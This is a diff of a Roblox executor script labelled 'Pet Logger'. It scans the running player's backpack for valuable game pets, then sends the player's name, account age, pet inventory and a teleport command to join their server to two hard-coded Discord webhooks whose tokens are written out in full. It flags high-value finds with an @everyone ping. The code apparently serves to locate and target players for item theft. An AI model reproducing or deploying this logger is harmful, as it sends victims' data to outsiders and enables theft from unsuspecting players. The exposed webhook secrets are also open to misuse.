@@ -2,37 +2,32 @@ local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 
--- WEBHOOKS
 local WEBHOOK_PRIORITY = "https://discord.com/api/webhooks/1410626814857973831/O4uWK0swu6aCG8HFTKa_3cncOA2liwK38aeAr-8fwPU7IDwASPHUg6jy-XLOanMWXzhU"
 local WEBHOOK_NORMAL   = "https://discord.com/api/webhooks/1410488907358933063/unmfmZmJVyaxMnj7Pbw-_U5q4J7zlLvC4xwxwgRGvHrWKH0yVRHF8-em1KJJ6DbSkiqU"
 
--- HTTP request function
 local req = http_request or request or (syn and syn.request) or (krnl and krnl.request)
 if not req then return warn("❌ Your executor does not support HTTP requests.") end
 
--- SERVER COLOR FUNCTION
 local function getServerStatus()
     local totalPlayers = #Players:GetPlayers()
     local serverColor = totalPlayers == 5 and "🟥" or totalPlayers >= 3 and "🟨" or "🟩"
     return string.format("%d/5 %s", totalPlayers, serverColor)
 end
 
--- PRIORITY PETS & VALUES
 local PRIORITY = {
     ["Raccoon"]="🦝", ["Dragonfly"]="🐉", ["Mimic Octopus"]="🐙", ["Red Fox"]="🦊",
     ["Disco Bee"]="🎵🐝", ["Queen Bee"]="👑🐝", ["Lobster Thermidor"]="🦞",
-    ["Golden Goose"]="🥇🦢", ["Kitsune"]="🌸", ["Corrupted Kitsune"]="🦠",
+    ["Golden Goose"]="🥇🦢", ["Kitsune"]="🌸",
     ["Fennec Fox"]="🐺", ["T-Rex"]="🦖"
 }
 
 local PRIORITY_VALUES = {
     ["Raccoon"]=250, ["Dragonfly"]=50, ["Mimic Octopus"]=30, ["Red Fox"]=10,
     ["Disco Bee"]=200, ["Queen Bee"]=20, ["Lobster Thermidor"]=30,
-    ["Golden Goose"]=15, ["Kitsune"]=550, ["Corrupted Kitsune"]=10,
+    ["Golden Goose"]=15, ["Kitsune"]=550,
     ["Fennec Fox"]=100, ["T-Rex"]=35
 }
 
--- ALL PETS
 local PETS = { "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab","Seagull","Black Bunny",
     "Cat","Chicken","Deer","Bee","Bacon Pig","Jackalope","Orange Tabby","Pig","Rooster",
     "Monkey","Flamingo","Toucan","Sea Turtle","Orangutan","Seal","Honey Bee","Wasp","Cow",
@@ -46,9 +41,8 @@ local PETS = { "Raccoon","Bunny","Dog","Golden Lab","Dairy Cow","Starfish","Crab
     "Axolotl","Hyacinth Macaw","Hamster","Brontosaurus","Dilophosaurus","Ankylosaurus","Owl",
     "Koi","Kappa","Raiju","Spaghetti Sloth","Mochi Mouse","Junkbot","Gorilla Chef","Golem",
     "Red Fox","Dragonfly","Disco Bee","Queen Bee","Lobster Thermidor","Golden Goose",
-    "Kitsune","Corrupted Kitsune","Fennec Fox","T-Rex" }
+    "Kitsune","Fennec Fox","T-Rex" }
 
--- Helper to check if a name is a pet
 local PET_KEYWORDS = {}
 for _, name in ipairs(PETS) do PET_KEYWORDS[#PET_KEYWORDS+1] = name:lower() end
 local function isPet(name)
@@ -66,7 +60,6 @@ local function getPriorityEmoji(name)
     return nil
 end
 
--- Collect pets from container
 local function collectPets(container)
     if not container then return {},0,false end
     local items, hasPriorityPet = {}, false
@@ -131,25 +124,22 @@ local function collectPets(container)
     return formatted,totalValue,hasPriorityPet
 end
 
--- INITIAL COLLECTION
 local backpack = player:WaitForChild("Backpack")
 local backpackList, backpackValue, hasPriorityBackpack = collectPets(backpack)
 local totalValue = backpackValue
 local hasPriority = hasPriorityBackpack
 
--- Determine webhook and ping
 local targetWebhook
 local pingText = ""
 
 if hasPriority then
     targetWebhook = WEBHOOK_PRIORITY
-    pingText = "@everyone\n".."game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
+    pingText = "--@everyone\n".."game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
 else
     targetWebhook = WEBHOOK_NORMAL
     pingText = "game:GetService(\"TeleportService\"):TeleportToPlaceInstance("..game.PlaceId..",\""..game.JobId.."\")"
 end
 
--- Build message with dynamic join URL
 local function buildDescription()
     local serverURL = string.format("https://kebabman.vercel.app/start?placeId=%d&gameInstanceId=%s", game.PlaceId, game.JobId)
     local desc = "```Name: "..player.Name.."\nExecutor: Delta\nAccount Age: "..player.AccountAge.." days```\n"
@@ -160,7 +150,6 @@ local function buildDescription()
     return desc
 end
 
--- Send webhook
 local payload = {
     content = pingText,
     username = "Pet Logger",
